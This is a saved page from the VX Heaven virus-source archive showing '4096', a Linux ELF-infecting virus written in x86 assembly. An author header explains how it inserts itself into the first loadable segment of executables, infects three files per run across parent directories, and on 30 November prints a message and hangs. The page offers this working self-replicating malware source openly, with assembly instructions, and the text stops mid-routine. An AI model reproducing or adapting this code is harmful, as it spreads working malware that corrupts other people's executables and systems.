<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>4096 - Virus for Linux written by badCRC (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content=""/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, –∫–æ–º–ø—å—é—Ç–µ—Ä–Ω—ã–µ –≤–∏—Ä—É—Å—ã, –≤–∏—Ä—É—Å, –≤–∏—Ä–∏"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"4bd9cbd79e5fe7adfdcf27a219452c7a2a268a15-1498759743-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Librer√≠a</a> <a href="/vl.php">Colecci√≥n</a> <a href="/src.php">C√≥digos fuente</a> <a href="/vx.php?id=eidx">Motores</a> <a href="/vx.php?id=tidx">Constructores</a> <a href="/vx.php?id=sidx">Simuladores</a> <a href="/vx.php?id=uidx">Utilidades</a> <a href="/links.php">Enlaces</a> <a href="/donate.php" style="color: #706020" id="donate">Donar</a> <a href="/forum" style="text-decoration: underline;">Foro</a> </span><br clear="all"/>
</div>
<div><div style="float:right;"><a href="/src_view.php?tbs=0"><img src="/img/min.gif" alt="Minimize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">–†—É—Å—Å–∫–∏–π</option><option value="en">English</option><option value="ua">–£–∫—Ä–∞—ó–Ω—Å—å–∫–∞</option><option value="de">Deutsch</option><option selected="selected" value="es">Espa√±ol</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: left;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="32" value=" "/>
<input type="submit" name="sa" value="Buscar"/>
</form>
</div><br clear="both"/></div>
<div class="s2"><h1>C√≥digo fuente de virus inform√°ticos</h1><h2>4096</h2><p><em>Virus for Linux</em></p><p><strong>badCRC</strong><br/><small><a href="/src.php?author=badCRC">Mostrar todos los virus de este autor</a></small></p><small><a href="/src.php?info=4096.zip">Descripci√≥n y descarga</a></small><br/><p>2003-08-00</p><h2>4096.asm</h2> [<a href="/src_view.php?file=4096.zip&amp;view=4096.asm&amp;highlight=off">Apagar el coloreado sint√°ctico</a>] <hr/><pre class="asm" style="font-family:monospace;color: #000066; background-color: #cccbbb;"><span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;	Virus name.....................4096</span>
<span style="color: black; font-style: italic;">;	Author.........................badCRC</span>
<span style="color: black; font-style: italic;">;	E-mail.........................<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="23574b4649465057465147424d4046634b4c574e424a4f0d404c4e">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></span>
<span style="color: black; font-style: italic;">;	Length.........................556 bytes</span>
<span style="color: black; font-style: italic;">;	OS.............................Linux</span>
<span style="color: black; font-style: italic;">;	Origin.........................Spain</span>
<span style="color: black; font-style: italic;">;	Finished.......................August 2003</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;	--∑--∑--∑--∑--∑-</span>
<span style="color: black; font-style: italic;">;	| INTRODUCTION |</span>
<span style="color: black; font-style: italic;">;	--∑--∑--∑--∑--∑-</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;	  First of all, I have to say my english is not very  good,  so</span>
<span style="color: black; font-style: italic;">;	I'm sorry if you don't understand all  I  write.  I'll  try  to</span>
<span style="color: black; font-style: italic;">;	explain me in the best way I can ;)</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;	  This is my first released virus and I want to dedicate it  to</span>
<span style="color: black; font-style: italic;">;	a girl who is very special for me (she knows who she is  :)  On</span>
<span style="color: black; font-style: italic;">;	the other hand, I also want to thank Wintermute for  his  virus</span>
<span style="color: black; font-style: italic;">;	course and all the people in  the  scene  who  write  or  wrote</span>
<span style="color: black; font-style: italic;">;	interesting things.</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;	--∑--∑--∑--∑--</span>
<span style="color: black; font-style: italic;">;	| DISCLAIMER |</span>
<span style="color: black; font-style: italic;">;	--∑--∑--∑--∑--</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;	  I'm not responsible for what you do with this  virus  and  if</span>
<span style="color: black; font-style: italic;">;	you spread it, it will be your  fault  and  not  mine.  So,  be</span>
<span style="color: black; font-style: italic;">;	careful. In any case, this virus is  less  dangerous  than  the</span>
<span style="color: black; font-style: italic;">;	Windows OS as you'll see xD</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;	--∑--∑--∑--∑</span>
<span style="color: black; font-style: italic;">;	| FEATURES |</span>
<span style="color: black; font-style: italic;">;	--∑--∑--∑--∑</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;	  It's about a runtime mid-file virus that  infects  executable</span>
<span style="color: black; font-style: italic;">;	ELF files. Every time it is executed, it will try to  infect  3</span>
<span style="color: black; font-style: italic;">;	files and then, it will return control to host. These files can</span>
<span style="color: black; font-style: italic;">;	be in any directory that belong to the virus path. For example,</span>
<span style="color: black; font-style: italic;">;	if the the virus resides  in  /tools/bin/,  it  will  look  for</span>
<span style="color: black; font-style: italic;">;	files in bin, tools and /, that is, the root dir.</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;	  I think the most interesting  thing  in  this  virus  is  the</span>
<span style="color: black; font-style: italic;">;	infection method, so I'm going to explain it a little :)</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;	  When the virus finds a file suitable for infection,  it  will</span>
<span style="color: black; font-style: italic;">;	search in the PHT for the first loadable segment,  usually  the</span>
<span style="color: black; font-style: italic;">;	text segment. Now, we have to check for free space in the  last</span>
<span style="color: black; font-style: italic;">;	memory page that this segment occupies because we want to  copy</span>
<span style="color: black; font-style: italic;">;	us there. How? It's easy: subtract from 1000h the  last  3  hex</span>
<span style="color: black; font-style: italic;">;	digits in p_memsz (I assume 4 KB pages). Let's see an  example.</span>
<span style="color: black; font-style: italic;">;	Suppose p_memsz = 12AF9h. So, how much space  is  free  in  the</span>
<span style="color: black; font-style: italic;">;	last page? 1000h - AF9h = 507h = 1287 bytes. Why are we limited</span>
<span style="color: black; font-style: italic;">;	in this way? Because we copy us in the first loadable  segment,</span>
<span style="color: black; font-style: italic;">;	and if there is another one, its first page will be  next  ours</span>
<span style="color: black; font-style: italic;">;	and we don't want to be overwritten when the program is  loaded</span>
<span style="color: black; font-style: italic;">;	into memory.</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;	  Next step is increase file size and copy the virus  into  the</span>
<span style="color: black; font-style: italic;">;	file. We'll have to fix the offsets of some entries in the  PHT</span>
<span style="color: black; font-style: italic;">;	because of we are going to copy us  where  the  first  loadable</span>
<span style="color: black; font-style: italic;">;	segment ends, that is, p_offset + p_filesz. The file size  will</span>
<span style="color: black; font-style: italic;">;	be increased in 1000h bytes because file offsets (p_offset) and</span>
<span style="color: black; font-style: italic;">;	virtual addresses (p_vaddr) must be congruent modulo  the  page</span>
<span style="color: black; font-style: italic;">;	size (1000h), that is, if you divide  p_offset  or  p_vaddr  by</span>
<span style="color: black; font-style: italic;">;	1000h,  the  remainder   will   be   the   same.   For   better</span>
<span style="color: black; font-style: italic;">;	understanding, imagine there is another loadable  segment  next</span>
<span style="color: black; font-style: italic;">;	ours and we have to fix its offset. Suppose  p_offset = 2BF00h,</span>
<span style="color: black; font-style: italic;">;	p_vaddr = 8074F00h and virus length = 100h. If we increase file</span>
<span style="color: black; font-style: italic;">;	size in 100h bytes, we'll have to add 100h to p_offset (2C000h)</span>
<span style="color: black; font-style: italic;">;	and then, p_offset and p_vaddr won't be congruent modulo 1000h.</span>
<span style="color: black; font-style: italic;">;	So, the minimum value in order they  continue  being  congruent</span>
<span style="color: black; font-style: italic;">;	is 1000h.</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;	  I hope you have understood it. If not, take  a  look  at  the</span>
<span style="color: black; font-style: italic;">;	code, ok? Good luck!</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;	--∑--∑--∑--</span>
<span style="color: black; font-style: italic;">;	| PAYLOAD |</span>
<span style="color: black; font-style: italic;">;	--∑--∑--∑--</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;	  Every 30 November the virus  will  print  a  message  on  the</span>
<span style="color: black; font-style: italic;">;	screen. The way I use to compute the date is  not  precise,  so</span>
<span style="color: black; font-style: italic;">;	the virus will activate a day before or after sometimes.</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;	--∑--∑--∑--∑--∑</span>
<span style="color: black; font-style: italic;">;	| TO ASSEMBLE |</span>
<span style="color: black; font-style: italic;">;	--∑--∑--∑--∑--∑</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;	nasm 4096.asm -o 4096.tmp -f elf</span>
<span style="color: black; font-style: italic;">;	ld 4096.tmp -o 4096 -s</span>
<span style="color: black; font-style: italic;">;	dwarf.exec 4096</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;</span>
&nbsp;
&nbsp;
<span style="color: #0000ff; font-weight: bold;">BITS</span>       <span style="color: #ff0000;">32</span>
<span style="color: #0000ff; font-weight: bold;">SECTION</span>   <span style="color: #0000ff; font-weight: bold;">.text</span>
<span style="color: #0000ff; font-weight: bold;">GLOBAL</span>    _start
&nbsp;
_start<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">pushfd</span>
      <span style="color: #00007f; font-weight: bold;">pushfd</span>
      <span style="color: #00007f; font-weight: bold;">pushad</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">call</span>    delta
&nbsp;
delta<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esp</span>
      <span style="color: #00007f; font-weight: bold;">lodsd</span>
      <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>delta
      <span style="color: #00007f; font-weight: bold;">xchg</span>    <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebp</span>                       <span style="color: black; font-style: italic;">; EBP = delta offset</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">,</span><span style="color: #ff0000;">730h</span>
&nbsp;
&nbsp;
<span style="color: black; font-style: italic;">; time returns the seconds since January 1, 1970. Starting from this value,</span>
<span style="color: black; font-style: italic;">;we have to compute the actual date</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0dh</span>                        <span style="color: black; font-style: italic;">; sys_time</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esp</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">cdq</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">151bbh</span>                    <span style="color: black; font-style: italic;">; 86459 seconds</span>
      <span style="color: #00007f; font-weight: bold;">div</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span>
      <span style="color: #00007f; font-weight: bold;">cdq</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">16dh</span>                      <span style="color: black; font-style: italic;">; 365 days</span>
      <span style="color: #00007f; font-weight: bold;">div</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span>
      <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">14dh</span>                       <span style="color: black; font-style: italic;">; 30 Nov?</span>
      <span style="color: #00007f; font-weight: bold;">jne</span>     no_activarse
&nbsp;
&nbsp;
<span style="color: black; font-style: italic;">; PAYLOAD</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">04h</span>                        <span style="color: black; font-style: italic;">; sys_write</span>
      <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span>
      <span style="color: #00007f; font-weight: bold;">inc</span>     <span style="color: #46aa03; font-weight: bold;">ebx</span>
      <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span>mensaje<span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: black;">&#93;</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>len
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">jmp</span>     <span style="color: #0000ff; font-weight: bold;">$</span>
&nbsp;
&nbsp;
no_activarse<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: black;">&#91;</span>numinfect<span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span>      <span style="color: black; font-style: italic;">; set number of infections to 0</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span>old_entry<span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: black;">&#93;</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">24h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0b7h</span>                       <span style="color: black; font-style: italic;">; sys_getcwd</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">334h</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">400h</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
abrir_dir<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span>dot<span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: black;">&#93;</span>
      <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">05h</span>                        <span style="color: black; font-style: italic;">; sys_open</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">xchg</span>    <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span>                       <span style="color: black; font-style: italic;">; EBX = fd</span>
      <span style="color: #00007f; font-weight: bold;">xchg</span>    <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esp</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">22ah</span>
&nbsp;
leer_entrada<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">59h</span>                        <span style="color: black; font-style: italic;">; old_readdir</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">dec</span>     <span style="color: #46aa03; font-weight: bold;">eax</span>
      <span style="color: #00007f; font-weight: bold;">jz</span>      infect
&nbsp;
      <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">06h</span>                        <span style="color: black; font-style: italic;">; sys_close</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">02h</span>
      <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0b7h</span>                       <span style="color: black; font-style: italic;">; sys_getcwd</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esp</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">22h</span>
      <span style="color: #00007f; font-weight: bold;">jnz</span>     salir
&nbsp;
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span>
      <span style="color: #00007f; font-weight: bold;">dec</span>     <span style="color: #46aa03; font-weight: bold;">ebx</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0ch</span>                        <span style="color: black; font-style: italic;">; sys_chdir</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">or</span>      <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span>
      <span style="color: #00007f; font-weight: bold;">jns</span>     abrir_dir
&nbsp;
salir<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0ch</span>                        <span style="color: black; font-style: italic;">; sys_chdir</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span>
      <span style="color: #00007f; font-weight: bold;">popad</span>
      <span style="color: #00007f; font-weight: bold;">popfd</span>
      <span style="color: #00007f; font-weight: bold;">ret</span>                                   <span style="color: black; font-style: italic;">; return control to host</span>
&nbsp;
infect<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">pushad</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">05h</span>                        <span style="color: black; font-style: italic;">; sys_open</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0ah</span>
      <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">02h</span>                        <span style="color: black; font-style: italic;">; O_RDWR</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">test</span>    <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span>                       <span style="color: black; font-style: italic;">; error?</span>
      <span style="color: #00007f; font-weight: bold;">jns</span>     seguimos
&nbsp;
      <span style="color: #00007f; font-weight: bold;">popad</span>
      <span style="color: #00007f; font-weight: bold;">jmp</span>     leer_entrada
&nbsp;
seguimos<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">xchg</span>    <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span>                       <span style="color: black; font-style: italic;">; EBX = fd</span>
      <span style="color: #00007f; font-weight: bold;">xchg</span>    <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span>
      <span style="color: #00007f; font-weight: bold;">inc</span>     <span style="color: #46aa03; font-weight: bold;">eax</span>                           <span style="color: black; font-style: italic;">; EAX = 3 (sys_read)</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">234h</span>                      <span style="color: black; font-style: italic;">; amount of bytes we want to</span>
                                            <span style="color: black; font-style: italic;">;read from the file (52 + 512)</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esp</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20h</span>
      <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span>
      <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">80h</span>
&nbsp;
      <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">464c457fh</span>         <span style="color: black; font-style: italic;">; ELF?</span>
      <span style="color: #00007f; font-weight: bold;">jnz</span>     @close_file
      <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">02h</span>            <span style="color: black; font-style: italic;">; executable?</span>
      <span style="color: #00007f; font-weight: bold;">jnz</span>     @close_file
&nbsp;
busca_loadable<span style="color: #339933;">:</span>
      <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20h</span>                       <span style="color: black; font-style: italic;">; next entry in the PHT</span>
